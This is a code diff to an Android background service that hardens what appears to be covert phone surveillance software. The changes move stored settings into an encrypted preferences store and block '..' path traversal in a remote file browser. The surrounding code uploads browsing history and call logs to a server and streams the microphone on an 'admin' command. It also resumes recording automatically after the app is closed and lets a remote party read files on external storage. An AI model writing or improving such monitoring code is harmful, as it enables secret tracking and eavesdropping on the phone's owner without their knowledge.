@@ -76,7 +76,6 @@ public class KeepAliveService extends Service {
 
     private static final String CHANNEL_ID = "meeee_bg";
     private static final int    NOTIF_ID   = 1001;
-    private static final String PREFS_NAME = "meeee";
     private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB
 
     private PowerManager.WakeLock wakeLock;
@@ -156,7 +155,7 @@ public class KeepAliveService extends Service {
         }
         acquireWakeLock();
 
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        SharedPreferences prefs = SecurePrefs.get(this);
         serverUrl = prefs.getString("serverUrl", null);
         userName  = prefs.getString("name", null);
         if (serverUrl != null && userName != null) {
@@ -188,7 +187,7 @@ public class KeepAliveService extends Service {
                 serverUrl = intent.getStringExtra("serverUrl");
                 userName  = intent.getStringExtra("name");
                 if (serverUrl != null && userName != null) {
-                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
+                    SecurePrefs.get(this).edit()
                         .putString("serverUrl", serverUrl)
                         .putString("name", userName)
                         .apply();
@@ -339,7 +338,7 @@ public class KeepAliveService extends Service {
 
     private static void queueBrowsingEvent(Context ctx, JSONObject entry) {
         try {
-            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            SharedPreferences prefs = SecurePrefs.get(ctx);
             JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
             pending.put(entry);
             prefs.edit().putString("pendingBrowsingEvents", pending.toString()).apply();
@@ -348,7 +347,7 @@ public class KeepAliveService extends Service {
 
     private void flushPendingBrowsingEvents() {
         try {
-            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            SharedPreferences prefs = SecurePrefs.get(this);
             JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
             if (pending.length() == 0) return;
             for (int i = 0; i < pending.length(); i++) {
@@ -381,7 +380,7 @@ public class KeepAliveService extends Service {
 
     private static void queueCallLogEvent(Context ctx, JSONObject entry) {
         try {
-            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            SharedPreferences prefs = SecurePrefs.get(ctx);
             JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
             pending.put(entry);
             prefs.edit().putString("pendingCallLogEvents", pending.toString()).apply();
@@ -390,7 +389,7 @@ public class KeepAliveService extends Service {
 
     private void flushPendingCallLogEvents() {
         try {
-            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            SharedPreferences prefs = SecurePrefs.get(this);
             JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
             if (pending.length() == 0) return;
             for (int i = 0; i < pending.length(); i++) {
@@ -420,7 +419,7 @@ public class KeepAliveService extends Service {
 
     private void syncCallLog() {
         if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        SharedPreferences prefs = SecurePrefs.get(this);
         long lastId = prefs.getLong("lastCallLogId", -1);
 
         Cursor cursor;
@@ -488,7 +487,7 @@ public class KeepAliveService extends Service {
                 flushPendingBrowsingEvents(); // send anything queued while we were disconnected
                 flushPendingCallLogEvents();
                 // Auto-resume mic if it was streaming before service was restarted
-                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                SharedPreferences prefs = SecurePrefs.get(this);
                 if (prefs.getBoolean("micActive", false) && !micStreaming) {
                     try {
                         JSONObject resumeMsg = new JSONObject();
@@ -797,7 +796,7 @@ public class KeepAliveService extends Service {
         if (micStreaming) return;
         fromAdminIdMic = msg.optString("fromAdminId");
         // Persist so the service auto-resumes after being swiped-away and restarted
-        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
+        SecurePrefs.get(this).edit()
             .putBoolean("micActive", true)
             .putString("micAdminId", fromAdminIdMic)
             .apply();
@@ -835,7 +834,7 @@ public class KeepAliveService extends Service {
     private void handleStopMic() {
         micStreaming = false;
         // Admin explicitly stopped mic — clear persisted state so restart won't auto-resume
-        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
+        SecurePrefs.get(this).edit()
             .remove("micActive").remove("micAdminId").apply();
         try {
             if (audioRecord != null) {
@@ -895,21 +894,36 @@ public class KeepAliveService extends Service {
     // ── Path helpers ───────────────────────────────────────────────────────────
 
     private File buildPath(JSONArray pathArr) throws Exception {
-        File dir = Environment.getExternalStorageDirectory();
+        File root = Environment.getExternalStorageDirectory();
+        File dir = root;
         if (pathArr != null) {
             for (int i = 0; i < pathArr.length(); i++)
                 dir = new File(dir, pathArr.getString(i));
         }
-        return dir;
+        return enforceWithinRoot(root, dir);
     }
 
     private File buildFilePath(JSONArray pathArr) throws Exception {
-        File f = Environment.getExternalStorageDirectory();
+        File root = Environment.getExternalStorageDirectory();
+        File f = root;
         if (pathArr != null) {
             for (int i = 0; i < pathArr.length(); i++)
                 f = new File(f, pathArr.getString(i));
         }
-        return f;
+        return enforceWithinRoot(root, f);
+    }
+
+    // Rejects any path whose canonical form falls outside the intended root — e.g. a
+    // crafted `path` array containing ".." segments that would otherwise let the remote
+    // file browser (ls / read_file) escape external storage.
+    private File enforceWithinRoot(File root, File candidate) throws Exception {
+        String rootCanonical = root.getCanonicalPath();
+        String candidateCanonical = candidate.getCanonicalPath();
+        if (!candidateCanonical.equals(rootCanonical)
+            && !candidateCanonical.startsWith(rootCanonical + File.separator)) {
+            throw new SecurityException("Path escapes root directory");
+        }
+        return new File(candidateCanonical);
     }
 
     private String getMimeType(String name) {
